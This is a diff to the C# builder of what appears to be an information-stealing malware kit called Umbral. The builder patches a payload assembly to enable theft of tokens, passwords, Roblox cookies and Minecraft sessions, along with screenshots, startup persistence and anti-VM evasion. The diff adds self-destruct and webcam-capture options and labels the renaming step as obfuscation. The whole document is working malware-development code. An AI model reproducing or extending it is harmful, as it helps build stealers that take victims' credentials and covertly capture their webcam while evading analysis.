@@ -28,7 +28,7 @@ namespace Umbral.builder.Build
 
     public class Builder
     {
-        private const string Version = "v1.0";
+        private const string Version = "v1.1";
         private const string PayloadFile = "Umbral.payload";
 
         public string Output;
@@ -36,7 +36,7 @@ namespace Umbral.builder.Build
         public string IconPath;
 
         public bool Ping;
-        public bool VmProtect;
+        public bool AntiVm;
         public bool Startup;
         public bool StealTokens;
         public bool StealPasswords;
@@ -44,6 +44,8 @@ namespace Umbral.builder.Build
         public bool StealRobloxCookies;
         public bool StealMinecraftSession;
         public bool CaptureScreenshot;
+        public bool SelfDestruct;
+        public bool CaptureWebcam;
 
         public AssemblyInfo AssemblyInformation;
 
@@ -108,9 +110,9 @@ namespace Umbral.builder.Build
                                 instruction.OpCode = OpCodes.Ldc_I4;
                                 instruction.Operand = Ping ? 1 : 0;
                                 break;
-                            case 2: // vmProtect 
+                            case 2: // antiVm 
                                 instruction.OpCode = OpCodes.Ldc_I4;
-                                instruction.Operand = VmProtect ? 1 : 0;
+                                instruction.Operand = AntiVm ? 1 : 0;
                                 break;
                             case 3: // startup  
                                 instruction.OpCode = OpCodes.Ldc_I4;
@@ -140,13 +142,21 @@ namespace Umbral.builder.Build
                                 instruction.OpCode = OpCodes.Ldc_I4;
                                 instruction.Operand = CaptureScreenshot ? 1 : 0;
                                 break;
+                            case 10: // deleteSelf
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = SelfDestruct ? 1 : 0;
+                                break;
+                            case 11: // captureWebcam
+                                instruction.OpCode = OpCodes.Ldc_I4;
+                                instruction.Operand = CaptureWebcam ? 1 : 0;
+                                break;
                         }
                     }
                 }
 
                 Renamer renamer = new Renamer(assembly);
                 if (!renamer.Perform())
-                    textBox.AppendText("\r\nRenaming Failed!");
+                    textBox.AppendText("\r\nObfuscation Failed!");
                 assembly.Write(tempFile);
 
                 #endregion
